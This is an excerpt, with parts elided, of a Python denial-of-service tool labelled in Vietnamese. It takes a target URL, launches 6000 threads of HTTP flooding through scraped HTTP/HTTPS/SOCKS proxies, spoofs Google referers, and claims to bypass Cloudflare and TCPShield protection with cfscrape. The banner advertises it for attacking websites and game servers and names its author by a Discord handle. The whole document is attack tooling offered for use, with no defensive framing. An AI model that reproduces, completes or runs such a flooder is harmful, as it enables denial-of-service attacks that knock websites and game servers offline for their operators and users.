...
try:
    ...
    print(Fore.YELLOW + '[-] Không có module nào tên là requests được cài đặt trên máy !!!')
    print(Fore.YELLOW + '[-] Không có module nào tên là cfscrape được cài đặt trên máy !!!')
    print(Fore.YELLOW + '[-] Không có module nào tên là colorama được cài đặt trên máy !!!')
    print(Fore.YELLOW + '[-] Không có module nào tên là UserAgent được cài đặt trên máy !!!')
    print(Fore.GREEN + '[+] Đang thử cài modules ...')
    ...
    referers = [
     ...
     'http://www.google.com/?q=',
     'http://www.google.com.vn/?q=',
     'http://www.google.uk/?q=',
     ...
     'https://www.google.com.vn/#hl=vi&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
    ...
    class Requests(threading.Thread):
        ...
        def requestsCloudFlare(self):
            ...
            while True:
                ...
                if self.choice == 'socks4':
                    scraper.proxies['socks4'] = {'socks4://': self.proxy}
                if self.choice == 'socks5':
                    scraper.proxies['socks5'] = {'socks5://': self.proxy}
                cloudflare = scraper.get((self.url), timeout=None, data=None, headers=None)
                print((Fore.CYAN + ' Bypass Cloudflare %s --Web Status: %s -- Xong %s --Proxy--| %s ' % (request_num, cloudflare.status_code, self.num, self.proxy)), end='')
        ...
        def requestsHttpFlood(self):
            ...
            if self.choice == 'https':
                ...
                opener = urllib.request.build_opener(proxy)
            if self.choice == 'socks4':
                proxy = urllib.request.ProxyHandler({'socks4': self.proxy})
                opener = urllib.request.build_opener(proxy)
            if self.choice == 'socks5':
                proxy = urllib.request.ProxyHandler({'socks5': self.proxy})
                opener = urllib.request.build_opener(proxy)
            ...
            while True:
                ...
                request_num += 1
                print((Fore.CYAN + ' |--DDoS Thường ==> requests %s >> Xong %s >>Proxy--| IP:Port ==> %s --|' % (request_num, self.num, self.proxy)), end='')
        ...
        def run(self):
            ...
            while True:
                try:
                    ...
                    try:
                        print(Fore.CYAN + '[+] server có thể đã die, trạng thái server trả lại là: %s\n' % e)
                    finally:
                        e = None
                        del e

                except urllib.request.URLError:
                    print(Fore.RED + '[+] Url sai, vui lòng kiểm tra lại !!!\n')
                except ValueError:
                    print(Fore.RED + '[+]Check url lỗi, vui lòng thử lại\n')
                except KeyboardInterrupt:
                    exit(Fore.RED + '[-]Đã tắt tool ')
                except Exception:
                    sys.stdout.write(Fore.RED + '[+] Host có thể đã die hoặc do proxy bị lỗi \n')
    ...
    class MainLoop:
        ...
        def home(self):
            ...
            global in_proxies
            print(Fore.GREEN + "\n            \n               _____                    __         __   _____     __ __   ___ \n               |  _ \    __ _   ______  | |       /  | | ____|  / / | |  / _ \ \n               | | | |  / _  | |  __  \ | |__    / | | | |__   / /__| |  \___/ \n               | | | | | / | | | /  \ | | __ \  /_/| | |__  \  |____  |  /   \ \n               | |_| | | \_| | | |  | | | | | |    | |  _ \  |      | |  | O | \n               |____/   \_ __| |_|  |_| |_| |_|    | | |_____|      |_|  \___/.xyz  \n \n                                               Version 1     \n \n  Tool đấm web + server game với proxy Http/Https/Socks4/Socks5 + Bypass Cloudflare / TCPShield \n+-----------------------------------------------------------------------------------------------+\n                                ")
            if os.name in ('nt', 'dos', 'ce'):
                os.system('title      TOOL DDOS BY DANH1548 - Discord: danhhh#0265')
            try:
                url = input('[*] Mục tiêu [https://domain.com]: ')
                num_threads = int(6000)
                choice = 'Tool đấm web bảo mật cao với http/https/socks4/socks5'
                mode = input('[+] Methods HttpFlood[H]/ CloudFlare[C]: ')
                Flood_Mode = mode == 'H' or True
                if mode == 'C' or None:
                    Flood_Mode = False
                while choice == 'Tool đấm web bảo mật cao với http/https/socks4/socks5':
                    choice = str(input('[*] Loại Proxy[http/https/socks4/socks5]: ')).strip()
                    if choice == 'http':
                        print(Fore.GREEN + ' ==> Đang lấy proxy, chờ chút... ' )
                        ...
                        print(Fore.YELLOW + '[+] Số lượng proxy http: %s .' % len(proxies_http))
                    ...
                    if choice == 'https':
                        ...
                        print(Fore.GREEN + '[+] Số lượng proxy Https: %s có thể còn sống.' % len(proxies_https))
                    ...
                    if choice == 'socks4':
                        ...
                        print(Fore.YELLOW + '[+] Số lượng Socks4 Proxies: %s có thể còn sống.' % len(proxies_socks4))
                    ...
                    if choice == 'socks5':
                        ...
                        print(Fore.YELLOW + '[+] Số lượng proxy Socks5: %s có thể còn sống. ' % len(proxies_socks5))
                ...
                for i in range(num_threads):
                    try:
                        ...
                        print(Fore.YELLOW + "[-] Không thể kết nối với web được chọn. Hãy thử lại :(")
                        time.sleep(10)
